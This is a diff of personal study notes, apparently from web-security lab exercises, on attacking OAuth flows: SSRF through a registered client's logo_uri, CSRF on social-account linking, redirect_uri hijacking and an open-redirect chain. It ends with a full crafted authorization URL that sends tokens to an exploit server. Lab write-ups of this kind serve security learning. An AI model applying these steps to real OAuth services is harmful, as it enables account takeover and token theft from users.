@@ -10,15 +10,17 @@
 	![[Pasted image 20260731173856.png|536]]
 
 
-Browse on https://oath/.well-known/openid-configuration to see config file
+2. Browse on https://oath/.well-known/openid-configuration to see config file
 -> locate registration encdpoint -> POST /reg (confirm you can register)
 -> Find users can specify logo_uri on other request GET /client/id/logo
+![[Pasted image 20260801194248.png]]
 -> use in the POST /reg other field logo_uri with SSRF link /admin
+![[Pasted image 20260801194300.png|629]]
 -> paste client id on /client/id/logo -> SSRF completed
+![[Pasted image 20260801194313.png|517]]
 
-
-No CSRF token protection:
-1. Oauth linking option, automatically logs you in, capture social logging linking, copy URL and drop
+3. No CSRF token protection:
+Oauth linking option, automatically logs you in, capture social logging linking, copy URL and drop
 Send to Victim
 
 ```js
@@ -27,11 +29,11 @@ Send to Victim
 
 Now if you log out and log in using social media profile you are instantly logged as administrator
 
-2. Hijack Redirect URI
+4. Hijack Redirect URI
 Gereate CSRF POC of /auth?clientid=[...] and change redirect uri to your exploit server
 Use the token recieved to log in with /oauth-callback?code=STOLEN
 
-3. Hijack Via Open Redirect
+5. Hijack Via Open Redirect
 Find Open redirect /post/next?path=exploit-server
 Confirm the redirection:
 https://oauth-0af4001104ece39e84d339950265009a.oauth-server.net/auth?client_id=cmhgvh5osg557j25uajyh&redirect_uri=https://0a3100e204c2e37084bc3b3d00a20002.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a5500d0048ce37284bf3a0a0106009f.exploit-server.net/&response_type=token&nonce=-1315320397&scope=openid%20profile%20email
